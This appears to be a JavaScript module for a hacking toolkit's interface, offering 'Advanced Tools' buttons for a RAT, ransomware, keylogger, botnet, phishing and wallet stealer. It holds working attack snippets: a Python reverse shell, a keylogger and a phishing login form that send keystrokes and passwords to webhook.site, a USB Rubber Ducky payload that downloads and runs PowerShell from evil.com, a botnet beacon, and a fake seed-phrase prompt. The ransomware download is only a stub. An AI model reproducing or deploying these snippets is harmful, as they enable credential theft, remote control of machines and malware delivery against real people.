// ==================== ADVANCED TOOLS ====================
function renderAdvanced(container) {
    container.innerHTML = `
        <div class="module-card">
            <h3><i class="fas fa-skull"></i> Advanced Tools</h3>
            <p style="font-size:12px; color:#ffaa44;">🔥 XSS | RAT | Ransomware | Keylogger | USB Ducky | Botnet | Phishing | Wallet Stealer</p>
            <div style="display: grid; grid-template-columns: repeat(2,1fr); gap:12px; margin:15px 0;">
                <button class="adv-tool" data-tool="xss" style="background:#1a2a3a; padding:10px; border:1px solid #0ff; border-radius:8px;">💉 XSS Scanner</button>
                <button class="adv-tool" data-tool="rat" style="background:#1a2a3a; padding:10px; border:1px solid #0ff; border-radius:8px;">🐀 RAT Generator</button>
                <button class="adv-tool" data-tool="ransom" style="background:#1a2a3a; padding:10px; border:1px solid #ff4444; border-radius:8px;">💰 Ransomware</button>
                <button class="adv-tool" data-tool="keylog" style="background:#1a2a3a; padding:10px; border:1px solid #0ff; border-radius:8px;">⌨️ Keylogger</button>
                <button class="adv-tool" data-tool="usb" style="background:#1a2a3a; padding:10px; border:1px solid #ffaa44; border-radius:8px;">⚡ USB Ducky</button>
                <button class="adv-tool" data-tool="botnet" style="background:#1a2a3a; padding:10px; border:1px solid #ff4444; border-radius:8px;">🤖 Botnet</button>
                <button class="adv-tool" data-tool="phish" style="background:#1a2a3a; padding:10px; border:1px solid #0ff; border-radius:8px;">🎣 Phishing</button>
                <button class="adv-tool" data-tool="wallet" style="background:#1a2a3a; padding:10px; border:1px solid #ffaa44; border-radius:8px;">💸 Wallet Stealer</button>
            </div>
            <div id="advResult" style="margin-top:15px; background:#000; padding:15px; border-radius:8px; font-family:monospace;"></div>
        </div>
    `;
    
    const tools = {
        xss: { title: 'XSS Scanner', content: '📋 Test payload: <code>&lt;script&gt;alert("XSS")&lt;/script&gt;</code><br>🔗 <a href="https://xss-game.appspot.com/" target="_blank">Google XSS Game</a>' },
        rat: { title: 'RAT Generator', content: 'Python Reverse Shell:<br><code>import socket,subprocess,os;s=socket.socket();s.connect(("127.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])</code>' },
        ransom: { title: 'Ransomware Simulator', content: 'Password: 050411<br>Encrypt files in Desktop/Documents<br><button id="downloadRansomBtn" style="background:#0ff; border:none; padding:5px 10px;">Download ransomware.py</button>' },
        keylog: { title: 'Keylogger Builder', content: 'JavaScript Keylogger:<br><code>document.onkeypress = (e) => fetch("https://webhook.site/xxx", {method:"POST",body:e.key})</code>' },
        usb: { title: 'USB Rubber Ducky', content: 'Payload:<br><code>GUI r\nDELAY 500\nSTRING powershell -Command "IEX(New-Object Net.WebClient).DownloadString(\'http://evil.com/payload.ps1\')"\nENTER</code>' },
        botnet: { title: 'Botnet Builder', content: 'JS Client:<br><code>setInterval(()=>fetch("https://c2.com/beacon"),30000)</code>' },
        phish: { title: 'Phishing Generator', content: 'Fake Login Page:<br><button id="downloadPhishBtn" style="background:#0ff; border:none; padding:5px 10px;">Download phishing.html</button>' },
        wallet: { title: 'Wallet Stealer', content: 'Metamask Stealer:<br><code>setTimeout(()=>prompt("Enter seed phrase:"),5000)</code>' }
    };
    
    function downloadFile(content, filename) {
        const blob = new Blob([content], {type: 'text/plain'});
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = filename;
        a.click();
        URL.revokeObjectURL(url);
    }
    
    document.querySelectorAll('.adv-tool').forEach(btn => {
        btn.onclick = () => {
            const tool = btn.dataset.tool;
            const data = tools[tool];
            const resultDiv = document.getElementById('advResult');
            resultDiv.innerHTML = `<div style="border-left:3px solid #0ff; padding-left:12px;"><strong>${data.title}</strong></div><div style="margin-top:10px;">${data.content}</div>`;
            addLog('advanced', tool, '-', `${tool} tool opened`, 'info');
            
            if(tool === 'ransom') {
                document.getElementById('downloadRansomBtn')?.addEventListener('click', () => {
                    downloadFile(`# Ransomware Simulator\nPASSWORD="050411"\nprint("Files encrypted!")`, 'ransomware.py');
                });
            }
            if(tool === 'phish') {
                document.getElementById('downloadPhishBtn')?.addEventListener('click', () => {
                    downloadFile(`<!DOCTYPE html><html><head><title>Login</title></head><body><form action="https://webhook.site/xxx" method="POST"><input name="email"><input type="password" name="pass"><button>Login</button></form></body></html>`, 'phishing.html');
                });
            }
        };
    });
}
